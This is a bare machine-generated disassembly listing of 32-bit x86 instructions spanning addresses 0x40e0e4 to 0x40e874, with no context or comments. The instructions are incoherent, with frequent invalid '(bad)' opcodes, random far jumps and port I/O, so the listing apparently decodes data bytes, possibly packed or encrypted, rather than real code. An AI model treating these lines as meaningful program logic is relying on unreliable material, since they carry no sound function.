  40e0e4:	je     0x40e0e9
  40e0e6:	adc    edx,DWORD PTR ds:0x7eb312fd
  40e0ec:	xor    dh,ah
  40e0ee:	(bad)  
  40e0ef:	fcom   QWORD PTR [esi+0x3b]
  40e0f2:	nop
  40e0f3:	sbb    bh,BYTE PTR [ecx]
  40e0f5:	sub    esi,eax
  40e0f7:	sahf   
  40e0f8:	add    BYTE PTR [eax+ebp*8+0x2e7f284d],ch
  40e0ff:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e101:	test   eax,0x6c4d0b3f
  40e106:	imul   BYTE PTR [esi+0x7f]
  40e109:	leave  
  40e10a:	mov    edx,0x32ae89e6
  40e10f:	xchg   edi,eax
  40e110:	sub    DWORD PTR [ecx+eax*4+0x64e68245],ecx
  40e117:	adc    cl,BYTE PTR [ecx]
  40e119:	mov    dh,BYTE PTR [edi]
  40e11b:	mov    ebx,0x216df22c
  40e120:	scas   eax,DWORD PTR es:[edi]
  40e121:	dec    edx
  40e122:	pop    eax
  40e123:	xchg   esp,eax
  40e124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e125:	mov    ds:0x778538ea,al
  40e12a:	sbb    ebx,DWORD PTR [eax-0x7d]
  40e12d:	rcr    DWORD PTR [eax-0x3d],cl
  40e130:	out    dx,al
  40e131:	mov    ebx,0xd12ebd54
  40e136:	arpl   WORD PTR [esi-0x297a56eb],bp
  40e13c:	jns    0xcae0a89b
  40e142:	aad    0xcc
  40e144:	inc    ecx
  40e145:	outs   dx,BYTE PTR ds:[esi]
  40e146:	addr16 out dx,al
  40e148:	outs   dx,BYTE PTR ds:[esi]
  40e149:	jbe    0x40e154
  40e14b:	mov    ch,0x3c
  40e14d:	inc    ebx
  40e14e:	std    
  40e14f:	push   esi
  40e150:	inc    edx
  40e151:	out    dx,eax
  40e152:	jo     0x40e101
  40e154:	ror    esp,0x73
  40e157:	test   eax,0x7f5d2d8c
  40e15c:	jmp    0xf922:0xc937aa94
  40e163:	mov    eax,ds:0xa60cd986
  40e168:	rcr    BYTE PTR [ebx-0x28],0x23
  40e16c:	jle    0x40e0fb
  40e16e:	inc    eax
  40e16f:	sbb    dh,BYTE PTR [ebx]
  40e171:	mov    bh,BYTE PTR [ecx]
  40e173:	scas   eax,DWORD PTR es:[edi]
  40e174:	call   0x3de3:0xd21df23d
  40e17b:	imul   edx,DWORD PTR [ecx+0x466f8e50],0xae59d818
  40e185:	in     al,0x60
  40e187:	mov    BYTE PTR [eax+edi*4-0x23ae0c10],dh
  40e18e:	push   ebx
  40e18f:	(bad)  
  40e190:	mov    esi,0x36a5264c
  40e195:	ret    0xec51
  40e198:	(bad)  
  40e199:	fisttp DWORD PTR [ebx+eiz*2+0x5c]
  40e19d:	das    
  40e19e:	test   BYTE PTR [edx+edi*4],ah
  40e1a1:	jb     0x40e145
  40e1a3:	test   al,0xdd
  40e1a6:	adc    eax,0xb5381e9a
  40e1ab:	mul    DWORD PTR [ecx]
  40e1ad:	fild   WORD PTR [edi-0x61b3de14]
  40e1b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b4:	cmp    DWORD PTR [eax+ecx*2+0x25],ecx
  40e1b8:	fs aas 
  40e1ba:	lahf   
  40e1bb:	stos   DWORD PTR es:[edi],eax
  40e1bc:	push   ebp
  40e1bd:	inc    ebp
  40e1be:	int3   
  40e1bf:	mov    eax,ds:0xc002f193
  40e1c4:	mov    edx,0xd3d86560
  40e1c9:	inc    edx
  40e1ca:	loope  0x40e1a0
  40e1cc:	out    0x7a,eax
  40e1ce:	or     DWORD PTR [esp+edi*8-0x76ef7cbd],0xfffffffc
  40e1d6:	sbb    BYTE PTR [eiz*8+0x1665c47d],ch
  40e1dd:	scas   al,BYTE PTR es:[edi]
  40e1de:	call   0x7909:0x73784921
  40e1e5:	add    edx,DWORD PTR ds:0xf304f217
  40e1eb:	dec    esi
  40e1ec:	push   ecx
  40e1ed:	mov    dh,0x3c
  40e1ef:	dec    ecx
  40e1f0:	jge    0x40e267
  40e1f2:	pop    ds
  40e1f3:	cs jp  0x40e1bb
  40e1f6:	adc    eax,0x4b939b97
  40e1fb:	add    ebp,DWORD PTR [edx+ebp*8]
  40e1fe:	dec    edx
  40e1ff:	or     BYTE PTR ds:0xd3de0c2c,bh
  40e205:	(bad)  
  40e206:	sbb    eax,0xe3160e51
  40e20b:	dec    eax
  40e20c:	mov    bh,0x9f
  40e20e:	hlt    
  40e20f:	adc    al,0x75
  40e211:	sub    DWORD PTR [edx+0x4d],ebx
  40e214:	(bad)  
  40e215:	inc    ch
  40e217:	push   0x25b85635
  40e21c:	xor    BYTE PTR [ebp-0x44],bl
  40e21f:	retf   
  40e220:	and    ch,BYTE PTR [ebx+0x59]
  40e223:	retf   
  40e224:	cmp    DWORD PTR [eax+0x52],ecx
  40e227:	add    BYTE PTR [ecx+0x7b],al
  40e22a:	(bad)  
  40e22c:	mov    edi,0x70c96ba8
  40e231:	lods   al,BYTE PTR ds:[esi]
  40e232:	adc    al,0x67
  40e234:	into   
  40e235:	dec    eax
  40e236:	aad    0x6c
  40e238:	test   BYTE PTR [ebx+0x1e04111b],ah
  40e23e:	mov    ds:0xa8b02f20,al
  40e243:	fisubr DWORD PTR [ebx+0x4b777411]
  40e249:	mov    DWORD PTR [esi-0x6b5d4413],esi
  40e24f:	dec    ebp
  40e250:	inc    edx
  40e251:	sbb    ebx,DWORD PTR [edi+ecx*8+0x6e9b2654]
  40e258:	jecxz  0x40e2bb
  40e25a:	mov    esi,DWORD PTR [edx]
  40e25c:	dec    ebp
  40e25d:	stos   BYTE PTR es:[edi],al
  40e25e:	loope  0x40e29e
  40e260:	mov    cl,0x3a
  40e262:	mov    ebx,0x2ef59722
  40e267:	ret    0xc61b
  40e26a:	leave  
  40e26b:	call   DWORD PTR [esi+eax*8+0x1f5fb86a]
  40e272:	pop    esi
  40e273:	and    DWORD PTR [edx+0x40],edi
  40e276:	xor    eax,0xa88a4b4
  40e27b:	icebp  
  40e27c:	fdivr  QWORD PTR [eax+0x21]
  40e27f:	ja     0x40e277
  40e281:	inc    ecx
  40e282:	cmp    ecx,DWORD PTR [edx+0x5be02771]
  40e288:	push   cs
  40e289:	push   cs
  40e28a:	mov    ds:0x2d04c3c4,al
  40e28f:	jne    0x40e28b
  40e291:	jne    0x40e267
  40e293:	ret    
  40e294:	or     DWORD PTR [edx],edi
  40e296:	mov    bl,0x4a
  40e298:	shr    BYTE PTR [ecx+ecx*4-0x3],cl
  40e29c:	es dec esi
  40e29e:	stc    
  40e29f:	pop    ecx
  40e2a0:	(bad)  
  40e2a1:	fs addr16 and al,0xc
  40e2a5:	adc    al,0x4e
  40e2a7:	jmp    0xefee:0x96799618
  40e2ae:	xchg   esp,eax
  40e2af:	xor    eax,ebp
  40e2b1:	cmp    dl,BYTE PTR [esi-0x5a]
  40e2b4:	cld    
  40e2b5:	data16 jl 0x40e2fe
  40e2b8:	rcl    DWORD PTR [esi],0xe0
  40e2bb:	mov    ds:0x8c2ed8bf,eax
  40e2c0:	mov    WORD PTR [ecx],es
  40e2c2:	bound  esp,QWORD PTR [ebx]
  40e2c4:	sub    al,0x49
  40e2c6:	call   0xc4bf37cb
  40e2cb:	xchg   esi,eax
  40e2cc:	xchg   ebp,eax
  40e2cd:	pop    edx
  40e2ce:	mov    WORD PTR [edx-0x2cf905fa],cs
  40e2d4:	mov    ah,0x2b
  40e2d6:	dec    edi
  40e2d7:	push   ecx
  40e2d8:	jmp    0x40e32b
  40e2da:	mov    ebp,0x34ee37b7
  40e2df:	test   BYTE PTR [edx],al
  40e2e1:	(bad)  
  40e2e3:	push   ebx
  40e2e4:	dec    BYTE PTR ds:0xd58ce868
  40e2ea:	sbb    BYTE PTR [ebx-0x41],0x80
  40e2ee:	sbb    bh,BYTE PTR [esi]
  40e2f0:	arpl   ax,dx
  40e2f2:	mov    ah,BYTE PTR [edx+ecx*1+0x18]
  40e2f6:	mov    edx,0x3a2c770e
  40e2fb:	push   0x88ef18e3
  40e300:	add    BYTE PTR [edi],dh
  40e302:	adc    BYTE PTR [eax],bh
  40e304:	cmp    edx,DWORD PTR ss:[ebp+0x2b]
  40e308:	out    dx,al
  40e309:	(bad)  
  40e30a:	ss dec esi
  40e30c:	mov    al,ds:0x289f985c
  40e311:	lgdtd  [edi]
  40e314:	ja     0x40e2f5
  40e316:	sub    BYTE PTR [ebp-0x47],al
  40e319:	add    dl,cl
  40e31b:	in     eax,0x8d
  40e31d:	or     ebp,DWORD PTR [edi+ebp*8+0x513b902d]
  40e324:	aam    0xfc
  40e326:	add    DWORD PTR [eax-0x35905a89],edx
  40e32c:	xor    eax,0xd862bdc0
  40e331:	sbb    al,BYTE PTR [ebx]
  40e333:	jbe    0x40e366
  40e335:	cmp    DWORD PTR [eax-0x64e8e3ea],ebp
  40e33b:	add    esi,eax
  40e33d:	and    BYTE PTR [edi+0x50],al
  40e340:	push   es
  40e341:	es pop ebx
  40e343:	sbb    eax,0x5f3c6d45
  40e348:	clc    
  40e349:	(bad)  
  40e34a:	shl    DWORD PTR [edx+0x8],cl
  40e34d:	(bad)  [edx]
  40e34f:	mov    al,ds:0x29fd0972
  40e354:	and    ah,ah
  40e356:	jne    0x40e3c9
  40e358:	xor    esi,DWORD PTR ss:[edi+0x6580f5b9]
  40e35f:	jae    0x40e33b
  40e361:	dec    esi
  40e362:	push   ecx
  40e363:	frstor [ebp+0x5f]
  40e366:	stos   BYTE PTR es:[edi],al
  40e367:	pushf  
  40e368:	scas   eax,DWORD PTR es:[edi]
  40e369:	jbe    0x40e2eb
  40e36b:	dec    esp
  40e36c:	(bad)  
  40e36d:	xchg   esi,eax
  40e36e:	(bad)  
  40e36f:	push   edi
  40e371:	sbb    BYTE PTR [edi+ebp*1-0x2a],0xa4
  40e376:	in     al,dx
  40e377:	or     cl,BYTE PTR [ebx]
  40e379:	sbb    DWORD PTR [eax+0x39bdbb1d],esp
  40e37f:	loop   0x40e3ac
  40e381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e382:	dec    ebp
  40e383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e384:	ss clc 
  40e386:	adc    al,BYTE PTR [esi+0x52]
  40e389:	push   esp
  40e38a:	mov    al,ds:0x8325ffc0
  40e38f:	les    esp,FWORD PTR [ebp+0x43270e3c]
  40e395:	cmp    eax,0x7b7aef13
  40e39a:	aas    
  40e39b:	sub    DWORD PTR [ecx-0x3f1860],0xee15c3ee
  40e3a5:	and    al,0x69
  40e3a7:	mov    DWORD PTR [eax+0x58],edi
  40e3aa:	push   ecx
  40e3ab:	add    ah,BYTE PTR [ebx+0x121346de]
  40e3b1:	in     al,dx
  40e3b2:	mov    WORD PTR [ebp-0x62],?
  40e3b5:	imul   edx,edi,0xffffff99
  40e3b8:	mov    ebp,0x1cc00a0f
  40e3bd:	enter  0x9043,0x7a
  40e3c1:	jl     0x40e3c0
  40e3c3:	dec    edi
  40e3c4:	push   es
  40e3c5:	inc    eax
  40e3c6:	add    BYTE PTR [edx],bl
  40e3c8:	adc    al,0x36
  40e3ca:	pop    ebp
  40e3cb:	jne    0x40e39b
  40e3cd:	bound  esp,QWORD PTR [edi-0x7]
  40e3d0:	imul   DWORD PTR [edi]
  40e3d2:	inc    edi
  40e3d3:	mov    bh,BYTE PTR [ebp-0x4caab679]
  40e3d9:	in     al,0xef
  40e3db:	pop    esp
  40e3dc:	inc    esp
  40e3dd:	and    al,0xcc
  40e3df:	sbb    DWORD PTR [ebx-0x42],esi
  40e3e2:	sbb    eax,0x32e4d7bb
  40e3e7:	daa    
  40e3e8:	mov    bl,0x56
  40e3ea:	xchg   ebp,eax
  40e3eb:	ss push ecx
  40e3ed:	fstp   DWORD PTR [esi+ebp*8+0x16]
  40e3f1:	rcl    DWORD PTR [esi+eax*8+0x5f],cl
  40e3f5:	mov    dl,0x7b
  40e3f7:	pop    ecx
  40e3f8:	out    0x3c,al
  40e3fa:	div    BYTE PTR [eax]
  40e3fc:	push   cs
  40e3fd:	test   DWORD PTR [ecx+0x1a9c1c03],ecx
  40e403:	or     esi,ebp
  40e405:	je     0x40e3c8
  40e407:	shl    BYTE PTR [esi],cl
  40e409:	xchg   ebp,eax
  40e40a:	mov    ah,BYTE PTR [ebx-0x7b2fa735]
  40e410:	(bad)  
  40e411:	shl    DWORD PTR [ecx+0x71],0xc0
  40e415:	outs   dx,BYTE PTR ds:[esi]
  40e416:	hlt    
  40e417:	mov    cl,0xe2
  40e419:	mov    dh,0x2e
  40e41b:	in     al,0xad
  40e41d:	aaa    
  40e41e:	cmp    DWORD PTR [esi-0x1e98f004],eax
  40e424:	lds    esi,FWORD PTR ds:[ebx+0x72d0dda2]
  40e42b:	ja     0x40e454
  40e42d:	xchg   BYTE PTR [ebx-0x4],bl
  40e430:	inc    ebx
  40e431:	aaa    
  40e432:	push   ss
  40e433:	sar    DWORD PTR [edx+0x64],0xc4
  40e437:	jno    0x40e49d
  40e439:	(bad)  
  40e43a:	out    dx,al
  40e43b:	imul   edi,DWORD PTR [ecx],0x29
  40e43e:	push   eax
  40e43f:	mov    DWORD PTR [edi+0x3fd09e19],esi
  40e445:	add    al,0xa7
  40e447:	mov    dh,0x4
  40e449:	dec    edx
  40e44a:	xor    DWORD PTR [esi],0xffffffda
  40e44d:	shl    DWORD PTR [ecx],cl
  40e44f:	add    BYTE PTR [edx],cl
  40e451:	call   0x7fd8:0xbd90c8ef
  40e458:	sbb    eax,0x732daefb
  40e45d:	push   cs
  40e45e:	push   edi
  40e45f:	pop    es
  40e460:	addr16 pusha 
  40e462:	xor    esp,DWORD PTR [edx]
  40e464:	cmp    eax,0xf7a138ea
  40e469:	jmp    0xb52a:0x7cf3596b
  40e470:	aad    0x1d
  40e472:	inc    esi
  40e473:	fist   DWORD PTR [esi]
  40e475:	jnp    0x40e483
  40e477:	ret    0x5536
  40e47a:	pop    ds
  40e47b:	dec    edi
  40e47c:	out    dx,al
  40e47d:	sar    DWORD PTR [ebx+0x8],0x84
  40e481:	mov    edi,0xa091dbf6
  40e486:	test   eax,0x45835b64
  40e48b:	jb     0x40e4d0
  40e48d:	push   edi
  40e48e:	mov    al,ds:0x10ac11c3
  40e493:	cs xchg ebx,eax
  40e495:	arpl   WORD PTR [ebx-0x25],si
  40e498:	sti    
  40e499:	fldenv [edi+esi*1+0x25b70503]
  40e4a0:	xchg   ebp,eax
  40e4a1:	stos   BYTE PTR es:[edi],al
  40e4a2:	fdivr  DWORD PTR cs:[ebx]
  40e4a5:	iret   
  40e4a6:	jl     0x40e512
  40e4a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4a9:	jge    0x40e4d0
  40e4ab:	lea    edx,[ecx+0x4ed778d8]
  40e4b1:	mov    ds:0xf48edd50,eax
  40e4b6:	in     al,dx
  40e4b7:	jg     0x40e496
  40e4b9:	pop    ebx
  40e4ba:	jns    0x40e449
  40e4bc:	add    DWORD PTR [ecx+0x458744c8],ebx
  40e4c2:	iret   
  40e4c3:	das    
  40e4c4:	int3   
  40e4c5:	xor    bh,al
  40e4c7:	inc    ebp
  40e4c8:	lods   al,BYTE PTR ds:[esi]
  40e4c9:	push   ecx
  40e4ca:	sub    DWORD PTR [ebp+0x246f4f5a],ecx
  40e4d0:	or     al,0x27
  40e4d2:	not    BYTE PTR [eax]
  40e4d4:	outs   dx,DWORD PTR ds:[esi]
  40e4d5:	rcr    DWORD PTR [ebx-0x52],cl
  40e4d8:	mov    eax,0x7c9a0893
  40e4dd:	mov    esp,0x9d6a9bfb
  40e4e2:	in     al,0xf3
  40e4e4:	mov    ch,0xa7
  40e4e6:	ror    DWORD PTR [ebx],0x94
  40e4e9:	jmp    0xa5b4:0xd76e10a9
  40e4f0:	jle    0x40e4eb
  40e4f2:	mov    ah,0x32
  40e4f4:	mov    al,ds:0x57991c2e
  40e4f9:	outs   dx,DWORD PTR ds:[esi]
  40e4fa:	retf   0xd8b6
  40e4fd:	fimul  WORD PTR [edx+0x48]
  40e500:	xchg   ebx,eax
  40e501:	pop    ebp
  40e502:	test   DWORD PTR [ebx+0x69],edx
  40e505:	sub    al,0xa
  40e507:	imul   esi,DWORD PTR [edi],0x68fc5da
  40e50d:	fistp  DWORD PTR [eax]
  40e50f:	sub    DWORD PTR [ebx-0x47],eax
  40e512:	test   BYTE PTR [ebx-0x2f],bl
  40e515:	retf   
  40e516:	or     eax,0x8e578e7f
  40e51b:	or     bh,BYTE PTR [ecx-0x68a50fa6]
  40e521:	cmp    al,0xd0
  40e523:	push   esp
  40e524:	or     al,0x1b
  40e526:	inc    edi
  40e527:	dec    ebp
  40e528:	xchg   BYTE PTR [ebx],cl
  40e52a:	sub    BYTE PTR [esp+ebp*2+0xfb33577],bh
  40e531:	push   esp
  40e532:	adc    BYTE PTR [esi+0x2975ba67],bh
  40e538:	add    ah,BYTE PTR [ecx+0x7c126df6]
  40e53e:	icebp  
  40e53f:	cdq    
  40e540:	out    0x5f,eax
  40e542:	ja     0x40e4e7
  40e544:	cwde   
  40e545:	inc    edx
  40e546:	or     cl,bl
  40e548:	fsqrt  
  40e54a:	clc    
  40e54b:	push   ss
  40e54c:	je     0x40e4f7
  40e54e:	xchg   edx,eax
  40e54f:	and    BYTE PTR [ebx],ah
  40e551:	cmp    esp,0xffffffd0
  40e554:	jle    0x40e5a3
  40e556:	jge    0x40e598
  40e558:	les    esi,FWORD PTR [edi+0x1c]
  40e55b:	push   ecx
  40e55c:	call   0x44e:0xdbcd3634
  40e563:	push   esp
  40e564:	outs   dx,BYTE PTR ds:[esi]
  40e565:	and    eax,DWORD PTR [ebx]
  40e567:	jle    0x40e5ca
  40e569:	arpl   WORD PTR [ebx],bx
  40e56b:	dec    esi
  40e56c:	mov    eax,ds:0x3c1d80ab
  40e571:	or     ebx,DWORD PTR [esi+ebx*1-0x3d]
  40e575:	push   edi
  40e576:	dec    esp
  40e577:	dec    ecx
  40e578:	push   cs
  40e579:	sub    eax,0x5b62a189
  40e57e:	jo     0x40e56f
  40e580:	pop    es
  40e581:	jbe    0x40e581
  40e583:	js     0x40e542
  40e585:	xor    edx,eax
  40e587:	mov    dl,0x67
  40e589:	aaa    
  40e58a:	retf   
  40e58b:	cdq    
  40e58c:	or     BYTE PTR [ebx-0x294b3669],0xec
  40e593:	popa   
  40e594:	mov    bl,ch
  40e596:	shr    BYTE PTR [ebx],0xe9
  40e599:	mov    WORD PTR [eax],es
  40e59b:	jno    0x40e542
  40e59d:	mov    edi,eax
  40e59f:	loope  0x40e61a
  40e5a1:	aas    
  40e5a2:	test   al,0x61
  40e5a4:	pop    esp
  40e5a5:	or     ebp,edi
  40e5a7:	sbb    ebp,ebx
  40e5a9:	jp     0x40e607
  40e5ab:	imul   edi,DWORD PTR [esi+0x53868124],0x8ea6ffdb
  40e5b5:	and    bl,BYTE PTR [eax]
  40e5b7:	ret    0x72b6
  40e5ba:	call   0x717751fd
  40e5bf:	(bad)
  40e5c3:	call   0x7824:0xb88591d0
  40e5ca:	push   cs
  40e5cb:	mul    esp
  40e5cd:	(bad)  
  40e5ce:	push   edi
  40e5cf:	pop    edi
  40e5d0:	push   esi
  40e5d1:	cmp    al,0xf2
  40e5d3:	mov    ds:0xd2b92630,al
  40e5d8:	stos   BYTE PTR es:[edi],al
  40e5d9:	dec    eax
  40e5da:	xchg   edi,eax
  40e5db:	mov    ax,0xdc5b
  40e5df:	dec    edi
  40e5e0:	lods   eax,DWORD PTR ds:[esi]
  40e5e1:	mov    dl,0xcd
  40e5e3:	adc    bl,ch
  40e5e5:	or     al,0xd7
  40e5e7:	inc    esp
  40e5e8:	mov    eax,0x61181f2e
  40e5ed:	and    DWORD PTR [esi-0x6e4470e3],0xffffffd3
  40e5f4:	test   eax,0x5fcfc75f
  40e5f9:	mov    ecx,0xff15b074
  40e5fe:	test   DWORD PTR [edx-0x6a],0x732a86a2
  40e605:	add    BYTE PTR [edi-0x66143297],0x9d
  40e60c:	and    DWORD PTR [ebx],ecx
  40e60e:	or     edi,DWORD PTR [ebx+0x4]
  40e611:	popa   
  40e612:	mov    esi,0x3123c2e9
  40e617:	inc    ebp
  40e618:	jb     0x40e68f
  40e61a:	add    DWORD PTR [ecx],ebx
  40e61c:	iret   
  40e61d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e61e:	test   al,0x3a
  40e620:	ret    0x589d
  40e623:	in     al,0x7e
  40e625:	sar    BYTE PTR [ebp-0x765c4004],0x5d
  40e62c:	mov    edi,0xb3c5d5a0
  40e631:	dec    eax
  40e632:	or     ebp,DWORD PTR [ecx+0x26704349]
  40e638:	data16 jbe 0x40e5d9
  40e63b:	cmp    al,0xc7
  40e63d:	xchg   esp,eax
  40e63e:	call   0x185e:0x1b9a6be5
  40e645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e646:	mov    dh,0x14
  40e648:	mov    edi,DWORD PTR [edi-0x7c]
  40e64b:	mov    esp,0x81f5e71c
  40e650:	xchg   ebx,eax
  40e651:	jp     0x40e5d8
  40e653:	retf   0x2e50
  40e656:	(bad)  
  40e658:	clc    
  40e659:	call   0xb205:0x69f4cce0
  40e660:	out    0x29,al
  40e662:	xchg   ebp,eax
  40e663:	add    al,0xb4
  40e665:	addr16 inc ecx
  40e667:	jns    0x40e62a
  40e669:	es js  0x40e6a1
  40e66c:	(bad)  
  40e66e:	dec    esi
  40e66f:	enter  0xeddb,0xc9
  40e673:	add    al,0xd0
  40e675:	scas   eax,DWORD PTR es:[edi]
  40e676:	fsubp  st(6),st
  40e678:	pop    ds
  40e679:	xchg   ebp,eax
  40e67a:	xchg   BYTE PTR [ebp-0x54],dl
  40e67d:	(bad)  
  40e67f:	inc    edx
  40e680:	int3   
  40e681:	push   ds
  40e682:	xchg   ecx,eax
  40e683:	iret   
  40e684:	imul   edi,esp,0x5f
  40e687:	stos   BYTE PTR es:[edi],al
  40e688:	lds    esi,FWORD PTR [ecx+0x550c7427]
  40e68e:	rol    DWORD PTR [ecx+0x10],1
  40e691:	xor    al,0x6e
  40e693:	mov    ebx,0x5044a3f2
  40e698:	adc    cl,BYTE PTR [ebx]
  40e69a:	xchg   dx,ax
  40e69c:	xor    BYTE PTR [ecx+0x6b],cl
  40e69f:	gs into 
  40e6a1:	sub    DWORD PTR [esi],ebx
  40e6a3:	out    0xc7,eax
  40e6a5:	sub    cl,BYTE PTR [ecx+ecx*1+0x6cdab03]
  40e6ac:	jecxz  0x40e6c8
  40e6ae:	add    edx,ecx
  40e6b0:	inc    ebp
  40e6b1:	into   
  40e6b2:	cmp    esp,esi
  40e6b4:	fisttp DWORD PTR [ebp+0x6c]
  40e6b7:	sbb    cl,BYTE PTR [esp+eax*1+0x55]
  40e6bb:	shl    dl,0xb7
  40e6be:	(bad)  
  40e6bf:	mov    cl,0xb3
  40e6c1:	add    dl,BYTE PTR [ecx]
  40e6c3:	push   eax
  40e6c4:	out    0x7c,eax
  40e6c6:	pop    ecx
  40e6c7:	in     al,0xd
  40e6c9:	push   eax
  40e6ca:	jae    0x40e672
  40e6cc:	pop    eax
  40e6cd:	and    al,0xd7
  40e6cf:	adc    ebx,DWORD PTR [edx-0x13]
  40e6d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6d3:	bnd jbe 0x40e68b
  40e6d6:	daa    
  40e6d7:	add    al,cl
  40e6d9:	or     DWORD PTR [eax+ecx*8],ebx
  40e6dc:	dec    edi
  40e6dd:	mov    ebp,DWORD PTR [ebp-0x3]
  40e6e0:	cs fwait
  40e6e2:	xchg   edx,eax
  40e6e3:	imul   eax,DWORD PTR [edx],0x39452130
  40e6e9:	les    ebp,FWORD PTR [ebx-0x664cec8c]
  40e6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6f0:	ret    
  40e6f1:	xchg   esi,eax
  40e6f2:	scas   al,BYTE PTR es:[edi]
  40e6f3:	shl    edi,cl
  40e6f5:	add    bl,BYTE PTR [ebx-0x1b]
  40e6f8:	dec    eax
  40e6f9:	mov    esi,0x57b37a0c
  40e6fe:	leave  
  40e6ff:	hlt    
  40e700:	cmc    
  40e701:	aam    0xc8
  40e703:	or     al,0xfe
  40e705:	xchg   ebp,eax
  40e706:	adc    eax,0x1b05894
  40e70b:	imul   edx,DWORD PTR [eax],0xc1e5a6db
  40e711:	add    BYTE PTR [edx+esi*4+0x41],bh
  40e715:	xor    DWORD PTR [ebx-0x11],ebp
  40e718:	or     DWORD PTR ds:0x8d506dc5,edx
  40e71e:	loope  0x40e793
  40e720:	neg    edx
  40e722:	and    bh,ch
  40e724:	jb     0x40e72e
  40e726:	and    eax,0xe08b2342
  40e72b:	sbb    DWORD PTR [ebx],edi
  40e72d:	mov    esi,edi
  40e72f:	jb     0x40e6b5
  40e731:	mov    al,ds:0xca626180
  40e736:	cs sub dl,0x4a
  40e73a:	mov    eax,ds:0xcc858000
  40e73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e740:	and    al,0xd6
  40e742:	in     al,0xce
  40e744:	xchg   esp,eax
  40e745:	gs jg  0x40e7b2
  40e748:	fucomi st,st(1)
  40e74a:	adc    al,BYTE PTR [esp+edi*4]
  40e74d:	mov    dh,0xc5
  40e74f:	loope  0x40e714
  40e751:	pop    ebx
  40e752:	sub    al,0x40
  40e754:	mul    DWORD PTR [edi-0x4891fb46]
  40e75a:	add    bl,BYTE PTR [eax-0x5f]
  40e75d:	inc    esi
  40e75f:	push   0xffffff88
  40e761:	jo     0x40e7aa
  40e763:	imul   dl
  40e765:	sbb    BYTE PTR [eax-0x6deb75db],ah
  40e76b:	sub    BYTE PTR [ecx+0x39a64428],al
  40e771:	sbb    edi,esi
  40e773:	fsubr  st(0),st
  40e775:	sbb    ecx,DWORD PTR ds:0x4f3ac067
  40e77b:	int3   
  40e77c:	adc    bl,al
  40e77e:	mov    dl,0x50
  40e780:	xchg   ecx,eax
  40e781:	sub    esp,DWORD PTR [edx]
  40e783:	mov    ds:0x9f6eb386,al
  40e788:	ss out dx,eax
  40e78a:	std    
  40e78b:	mov    gs,WORD PTR [ecx+0x2e60b390]
  40e791:	mov    bh,0xf0
  40e793:	pop    ecx
  40e794:	push   eax
  40e795:	push   ds
  40e796:	sbb    DWORD PTR [ecx],edx
  40e798:	or     ebx,DWORD PTR [ecx-0x7c]
  40e79b:	int    0x54
  40e79d:	test   eax,0x83460e2d
  40e7a2:	pop    ecx
  40e7a3:	xchg   ecx,eax
  40e7a4:	aas    
  40e7a5:	xchg   edi,eax
  40e7a6:	test   esi,0xf474f552
  40e7ac:	and    al,0x71
  40e7ae:	xor    al,0x5
  40e7b0:	retf   
  40e7b1:	mov    ebx,0xbbe964ec
  40e7b6:	add    al,0x25
  40e7b8:	data16 or BYTE PTR [esi-0x49e8d458],bl
  40e7bf:	out    0xc0,al
  40e7c1:	push   cs
  40e7c2:	nop
  40e7c3:	(bad)  
  40e7c4:	in     al,dx
  40e7c5:	std    
  40e7c6:	xor    edi,DWORD PTR [edx-0x57f2e439]
  40e7cc:	jmp    0x40e845
  40e7ce:	sub    BYTE PTR [ecx+0x5],ah
  40e7d1:	stc    
  40e7d2:	out    0xcb,eax
  40e7d4:	add    ecx,DWORD PTR [eax-0x51c0c835]
  40e7da:	or     edi,eax
  40e7dc:	xor    BYTE PTR [ecx],bh
  40e7de:	call   0x821c1e8e
  40e7e3:	dec    edx
  40e7e4:	data16 xlat BYTE PTR ds:[ebx]
  40e7e6:	xor    eax,DWORD PTR [esi+0x4e85be48]
  40e7ec:	dec    edi
  40e7ed:	add    eax,0x33bd7bbd
  40e7f2:	push   esp
  40e7f3:	mov    eax,DWORD PTR [esp+esi*8-0x6]
  40e7f7:	in     al,dx
  40e7f8:	push   eax
  40e7f9:	shl    dl,1
  40e7fb:	push   ebp
  40e7fc:	xchg   ebx,eax
  40e7fd:	(bad)  [eax+0x6c]
  40e800:	lock scas al,BYTE PTR es:[edi]
  40e802:	adc    cl,BYTE PTR [edx+ecx*4-0x27]
  40e806:	cmp    eax,0xcafcab4f
  40e80b:	lods   al,BYTE PTR ds:[esi]
  40e80c:	ret    
  40e80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e80e:	dec    edi
  40e80f:	xor    DWORD PTR [edx-0x32],esi
  40e812:	jl     0x40e86b
  40e814:	jno    0x40e882
  40e816:	retf   0x1616
  40e819:	jmp    0xbe100137
  40e81e:	add    al,0xc8
  40e820:	rol    esi,1
  40e822:	add    esp,DWORD PTR [ecx+0x47]
  40e825:	inc    ebp
  40e826:	mov    ah,0x3
  40e828:	dec    edx
  40e829:	pop    ebp
  40e82a:	xchg   esi,eax
  40e82b:	mov    ds:0xc5890158,eax
  40e830:	shr    DWORD PTR [edi-0x64668164],cl
  40e836:	mov    esi,0xf6f9fc37
  40e83b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e83c:	sub    dh,BYTE PTR [ebp-0x14]
  40e83f:	mov    DWORD PTR [ecx-0x13d1b864],esp
  40e845:	xor    BYTE PTR [esp+ebp*2+0x2025798c],cl
  40e84c:	fsubrp st(2),st
  40e84e:	imul   edi,DWORD PTR [edx+0x4b585cd9],0xd9760031
  40e858:	stc    
  40e859:	sbb    eax,ecx
  40e85b:	js     0x40e86a
  40e85d:	mov    esp,0xa4784c3d
  40e862:	test   DWORD PTR [ebp+0xf],ecx
  40e865:	cmc    
  40e866:	bound  ebx,QWORD PTR [edi+0xdf47ef3]
  40e86c:	xchg   esi,eax
  40e86d:	js     0x40e890
  40e86f:	mov    ds:0x2d35c61,eax
  40e874:	jnp    0x40e8c9
